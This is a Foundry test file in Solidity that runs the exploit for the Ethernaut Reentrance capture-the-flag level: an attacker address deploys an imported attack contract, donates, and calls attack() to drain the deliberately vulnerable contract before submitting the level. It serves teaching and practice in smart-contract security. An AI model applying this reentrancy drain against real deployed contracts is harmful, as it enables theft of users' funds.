// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// testing functionalities
import "forge-std/Test.sol";

// Ethernaut game components
import "src/core/Ethernaut.sol";
import "src/levels/10-Reentrance/ReentranceFactory.sol";
import "src/levels/10-Reentrance/ReentranceAttack.sol";

contract ReentranceTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    /// @dev eve is the attacker
    address eve = makeNameForAddress("eve");

    function setUp() public {
        emit log_string("Setting up Reentrance level...");
        ethernaut = new Ethernaut();
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function test_ReentranceExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        ReentranceFactory reentranceFactory = new ReentranceFactory();

        ethernaut.registerLevel(reentranceFactory);
        vm.startPrank(eve);

        /**
         * @dev this 0.001 ether has nothing to do with the solution
         * it is needed to create the level
         *
         * This is the ether that you can "steal" from the contract
         *
         * This has to be exactly 0.001 ether (check ReentranceFactory.sol)
         */
        vm.deal(eve, 0.001 ether);

        address payable levelAddress = payable(ethernaut.createLevelInstance{value: 0.001 ether}(reentranceFactory));
        Reentrance reentranceContract = Reentrance(levelAddress);
        // vm.deal(address(reentranceContract), 100 ether);

        emit log_named_uint("Balance of the vulnerable contract (initial): ", address(reentranceContract).balance);

        // Eve needs funds to donate to the contract
        vm.deal(eve, 1 ether);
        emit log_named_uint("Eve's ether balance: ", eve.balance);

        //                  Attack contract deployment                 //
        ReentranceAttack reentranceAttack = new ReentranceAttack(
            address(reentranceContract)
        );

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/

        emit log_string("Starting the exploit... 🧨");

        // 1 step - sending donation
        emit log_string("Eve sends the donation...");
        reentranceAttack.sendDonation{value: 0.01 ether}();
        vm.deal(address(reentranceContract), 1 ether);

        emit log_named_uint(
            "Attack contract's balance in the contract after donation: ",
            reentranceContract.balanceOf(address(reentranceAttack))
            );

        reentranceAttack.attack(0.01 ether);

        emit log_named_uint(
            "Attack contract balance in the contract after withdrawal: ",
            reentranceContract.balanceOf(address(reentranceAttack))
            );

        emit log_named_uint("Attack contract ether balance after donation: ", address(reentranceAttack).balance);

        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(uint160(uint256(keccak256(abi.encodePacked(name)))));
        vm.label(addr, name);
        return addr;
    }
}
